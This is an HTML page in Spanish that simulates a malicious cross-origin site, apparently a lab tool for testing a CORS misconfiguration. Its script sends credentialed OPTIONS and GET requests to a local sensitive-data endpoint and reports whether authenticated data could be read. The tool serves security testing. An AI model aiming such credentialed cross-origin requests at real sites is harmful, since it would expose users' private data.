<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Simulator - CORS Misconfiguration</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 2rem; }
        button { padding: 0.6rem 1rem; font-size: 1rem; }
        pre { background: #f4f4f4; padding: 1rem; border-radius: 8px; }
        .ok { color: #0b7a0b; }
        .ko { color: #b00020; }
    </style>
</head>
<body>
<h1>Simulador de Sitio Malicioso (CORS)</h1>
<p>
    Sirve este archivo desde otro origen (por ejemplo, puerto 5500) para simular un atacante.
</p>
<button id="run">Lanzar ataque</button>
<pre id="output">Esperando ejecución...</pre>

<script>
    const API_URL = 'http://localhost:8080/api/datos-sensibles';
    const output = document.getElementById('output');

    function log(message, cssClass = '') {
        const span = document.createElement('div');
        span.textContent = message;
        if (cssClass) span.className = cssClass;
        output.appendChild(span);
    }

    async function runAttack() {
        output.textContent = '';
        log('1) Enviando petición OPTIONS (preflight manual)...');

        try {
            const preflight = await fetch(API_URL, {
                method: 'OPTIONS',
                credentials: 'include'
            });
            log(`   OPTIONS respondió: ${preflight.status} ${preflight.statusText}`);
        } catch (e) {
            log('   OPTIONS bloqueado por CORS o fallo de red: ' + e.message, 'ko');
        }

        log('2) Enviando petición GET con credentials: include ...');
        try {
            const response = await fetch(API_URL, {
                method: 'GET',
                credentials: 'include'
            });

            const data = await response.json();
            log('   ✅ Vulnerable: el navegador permitió leer datos autenticados.', 'ok');
            log('   Respuesta: ' + JSON.stringify(data));
        } catch (e) {
            log('   ❌ Seguro/Mitigado: el navegador bloqueó el acceso por CORS.', 'ko');
            log('   Detalle: ' + e.message, 'ko');
        }
    }

    document.getElementById('run').addEventListener('click', runAttack);
</script>
</body>
</html>
